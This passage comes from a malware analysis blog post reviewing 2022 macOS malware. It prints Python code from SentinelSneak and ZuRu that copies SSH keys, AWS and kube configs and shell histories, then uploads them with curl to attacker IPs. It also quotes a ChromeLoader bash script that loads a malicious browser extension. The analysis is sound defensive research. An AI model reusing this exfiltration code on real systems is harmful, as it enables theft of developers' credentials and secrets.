</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    bashHistory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.bash_history&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    zshHistory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.zsh_history&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    gitConfig <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.gitConfig&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    hosts <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/etc/hosts&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>    ssh <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.ssh&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    zhHistory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.zhHistory&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    aws <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/home/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.aws&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>    kube <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/home/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.kube&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    serialId <span style="color:#f92672">=</span> str(subprocess_popen(<span style="color:#e6db74">&#34;hostname&#34;</span>))
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(bashHistory):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>        shutil<span style="color:#f92672">.</span>copyfile(bashHistory, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/bashHistory&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(zshHistory):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>        shutil<span style="color:#f92672">.</span>copyfile(zshHistory, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/zsh_history&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(gitConfig):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>        shutil<span style="color:#f92672">.</span>copyfile(gitConfig, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/gitConfig&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(hosts):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>        shutil<span style="color:#f92672">.</span>copyfile(hosts, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/hosts&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(ssh):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>        shutil<span style="color:#f92672">.</span>copytree(ssh, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/ssh&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(zhHistory):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>        shutil<span style="color:#f92672">.</span>copyfile(zhHistory, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/zhHistory&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(aws):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span>        shutil<span style="color:#f92672">.</span>copyfile(aws, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/aws&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(kube):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span>        shutil<span style="color:#f92672">.</span>copyfile(kube, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/kube&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span>    zip_ya(foldername)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span>    shutil<span style="color:#f92672">.</span>rmtree(foldername)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;curl -k -F </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">file=@&#34;</span> <span style="color:#f92672">+</span> zipname <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">https://54.254.189.27/api/v1/file/upload</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> &gt; /dev/null 2&gt;&amp;1&#34;</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span>    os<span style="color:#f92672">.</span>system(command)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span><span>    os<span style="color:#f92672">.</span>remove(zipname)</span></span></code></pre></div>
<p>As the Python code is not obfuscated, it fairly easy to understand. In a nutshell it copies various files (e.g. <code>/.bashHistory</code>, <code>/.gitConfig</code>, <code>/.ssh</code>, <code>/.aws</code>, etc) into a file named <code>~/Library/Logs/tmp/tmp.txt</code>. These files are then zipped up and exfiltrated via <code>curl</code> to <code>54.254.189.27</code>.</p>
<p>Jamf researchers noticed a high similarity to the malware known as <code>ZuRu</code> (uncovered in 2021 and blogged about by yours truly <a href="https://objective-see.org/blog/blog_0x66.html">here</a>). Specifically both <code>ZuRu</code> and <code>SentinelSpy</code> leverage rather similar Python code to exfiltrate files. Below is a snippet from <code>ZuRu</code>&rsquo;s <code>g.py</code> file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">writeFile</span>():
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    username <span style="color:#f92672">=</span> get_username()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    foldername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/Library/Logs/tmp&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    zipname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/Library/Logs/tmp.zip&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/Library/Logs/tmp/tmp.txt&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(foldername):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#75715e"># print(&#39;11111&#39;)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        shutil<span style="color:#f92672">.</span>rmtree(foldername)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    os<span style="color:#f92672">.</span>makedirs(foldername)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#39;a+&#39;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>        file<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;hostsÊñá‰ª∂ : [</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">]&#39;</span><span style="color:#f92672">.</span>format(get_hosts()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>        file<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;ÂΩìÂâçÁî®Êà∑Âêç : &#39;</span> <span style="color:#f92672">+</span> get_username() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>        file<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;test : [</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">]&#39;</span><span style="color:#f92672">.</span>format(subprocess_popen(<span style="color:#e6db74">&#34;bash -c ls /&#34;</span>)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    bashHistory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.bash_history&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    zshHistory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.zsh_history&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    gitConfig <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.gitConfig&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>    hosts <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/etc/hosts&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    ssh <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.ssh&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    zhHistory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/.zhHistory&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>    <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(bashHistory):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>      shutil<span style="color:#f92672">.</span>copyfile(bashHistory, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/bashHistory&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(zshHistory):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>      shutil<span style="color:#f92672">.</span>copyfile(zshHistory, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/zsh_history&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(gitConfig):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>      shutil<span style="color:#f92672">.</span>copyfile(gitConfig, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/gitConfig&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(hosts):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>      shutil<span style="color:#f92672">.</span>copyfile(hosts, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/hosts&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(ssh):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>      shutil<span style="color:#f92672">.</span>copytree(ssh, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/ssh&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(zhHistory):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>      shutil<span style="color:#f92672">.</span>copyfile(zhHistory, foldername <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/zhHistory&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>      <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>    zip_ya(foldername)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>    shutil<span style="color:#f92672">.</span>rmtree(foldername)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;curl -F </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">file=@&#34;</span> <span style="color:#f92672">+</span> zipname <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">http://47.75.123.111/u.php?id=</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> -v&#34;</span> <span style="color:#f92672">%</span>serialId
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span>    os<span style="color:#f92672">.</span>system(command)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span>    os<span style="color:#f92672">.</span>remove(zipname)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span>    <span style="color:#f92672">...</span></span></span></code></pre></div>
<p>&hellip;almost identical! üßê</p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>SentinelSneak</code> include the following (credit: ReversingLabs):</p>
<ul>
<li>Network:
<ul>
<li><code>54.254.189.27</code></li>
</ul>
</li>
</ul>
<p>For a (rather long) list of hashes of the malicious python packages, see ReversingLabs&rsquo; <a href="https://www.reversinglabs.com/blog/sentinelsneak-malicious-pypi-module-poses-as-security-sdk">report</a>.</p>
<br>
<h3 id="-and-all-others">üëæ And All Others</h3>
<p>This blog post provided a comprehensive technical analysis of the new mac malware of 2022. However it did not cover adware or malware from previous years. Of course, this is not to say such items are unimportant.</p>
<p>As such, here I&rsquo;ve include a list (and links to detailed writeups) of other notable items from 2022, for the interested reader.</p>
<ul style="list-style-type:square;">
  <li>
<p>üëæ <strong><code>NukeSped (variant N)</code></strong>
<br></p>
<p>In May, and again in August, ESET researchers observed attacks dropping the NukeSped malware:</p>
  <center>
  <blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/ESETresearch?src=hash&amp;ref_src=twsrc%5Etfw">#ESETresearch</a> A year ago, a signed Mach-O executable disguised as a job description was uploaded to VirusTotal from Singapore üá∏üá¨. Malware is compiled for Intel and Apple Silicon and drops a PDF decoy. We think it was part of <a href="https://twitter.com/hashtag/Lazarus?src=hash&amp;ref_src=twsrc%5Etfw">#Lazarus</a> campaign for Mac. <a href="https://twitter.com/pkalnai?ref_src=twsrc%5Etfw">@pkalnai</a> <a href="https://twitter.com/marc_etienne_?ref_src=twsrc%5Etfw">@marc_etienne_</a> 1/8 <a href="https://t.co/DV7peRHdnJ">pic.twitter.com/DV7peRHdnJ</a></p>&mdash; ESET Research (@ESETresearch) <a href="https://twitter.com/ESETresearch/status/1521735320852643840?ref_src=twsrc%5Etfw">May 4, 2022</a></blockquote>
  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

  </center>
  <center>
  <blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/ESETresearch?src=hash&amp;ref_src=twsrc%5Etfw">#ESETresearch</a> <a href="https://twitter.com/hashtag/BREAKING?src=hash&amp;ref_src=twsrc%5Etfw">#BREAKING</a> A signed Mac executable disguised as a job description for Coinbase was uploaded to VirusTotal from Brazil üáßüá∑. This is an instance of Operation In(ter)ception by <a href="https://twitter.com/hashtag/Lazarus?src=hash&amp;ref_src=twsrc%5Etfw">#Lazarus</a> for Mac. <a href="https://twitter.com/pkalnai?ref_src=twsrc%5Etfw">@pkalnai</a> <a href="https://twitter.com/dbreitenbacher?ref_src=twsrc%5Etfw">@dbreitenbacher</a> 1/7 <a href="https://t.co/dXg89el5VT">pic.twitter.com/dXg89el5VT</a></p>&mdash; ESET Research (@ESETresearch) <a href="https://twitter.com/ESETresearch/status/1559553324998955010?ref_src=twsrc%5Etfw">August 16, 2022</a></blockquote>
  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

  </center>
<p>The NukeSped malware is associated with the Lazarus APT group (North Korea), and this year&rsquo;s campaign is rather similar to those of past years.</p>
<p>Writeup:
<br>
¬† &ldquo;<a href="https://www.bleepingcomputer.com/news/security/north-korean-hackers-use-signed-macos-malware-to-target-it-job-seekers/">North Korean hackers use signed macOS malware to target IT job seekers</a>&rdquo;</p>
  </li>
  <br>
  <li> 
<p>üëæ <strong><code>ChromeLoader (adware)</code></strong>
<br>
In January a new adware campaign was uncovered, dubbed <code>ChromeLoader</code>. Over the next few months, various companies (including RedCanary, Palo Alto Networks, and CrowdStrike) tracked, analyzed, and published reports on this attack.</p>
<p>Though the attack campaign was originally <a href="https://twitter.com/x3ph1/status/1480385761295970305">discovered in January</a>, a macOS variant did not appear till March:</p>
<blockquote>
  "<i>In March 2022, a new variant emerged targeting MacOS users. This variant remains active and uses similar techniques to install its payload and hide its actions. It uses the same infection method of directing victims to compromised pay-per-download websites to install its dropper.

  In this case, the dropper is a disk image (DMG) file ‚Äì the MacOS implementation for ISO files ‚Äì containing several files, including one bash script.</i>" -Palo Alto Networks 
  </blockquote>
<p>As noted in the quote above, users were tricked into downloading malicious disk images (that pretended to be legitimate software, and/or cracked/pirated software). The malicious programs found on the .dmgs would persistently, as CrowdStriked noted, &ldquo;modify the user&rsquo;s browsing experience to deliver ads.&rdquo;</p>
<p><img src="../images/blog/blog_0x71/cxInstall.png"  width="100%" class="center" style="border-radius: 4px;">
  
  <center style="color:#787878; padding-top:5px;">Chompex Installer (credit: CrowdStrike)</center>

<br></p>
<p>The Palo Alto Networks researchers noted that for the macOS variant, the disk images would often contain a malicious bash script that performed two actions:</p>
<ul>
<li>Downloads a (malicious) browser extension</li>
<li>Loads the extension into the victim&rsquo;s browser</li>
</ul>
<p>From <a href="https://unit42.paloaltonetworks.com/chromeloader-malware/#post-123828-_mpyacggxtibk">their report</a>, here is an example bash script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>status code<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -write-out %<span style="color:#f92672">{</span>http_code<span style="color:#f92672">}</span> --head --silent - -output /dev/null https://funbeachdude.com/gp<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;status_code&#34;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span> <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>  popUrl<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s <span style="color:#e6db74">&#39;https://funbeachdude.com/gp&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>  performPop<span style="color:#f92672">=</span>$ <span style="color:#f92672">(</span>echo -ne <span style="color:#e6db74">&#34;open -na &#39;Google Chrome&#39; -args - load-extension=&#39;</span>$BPATH<span style="color:#e6db74">/</span>$XPATH<span style="color:#e6db74">&#39; --new-window &#39;&#34;</span>$popUr<span style="color:#f92672">]</span><span style="color:#e6db74">&#34;&#39;;&#34;</span> | base64<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#66d9ef">else</span> 
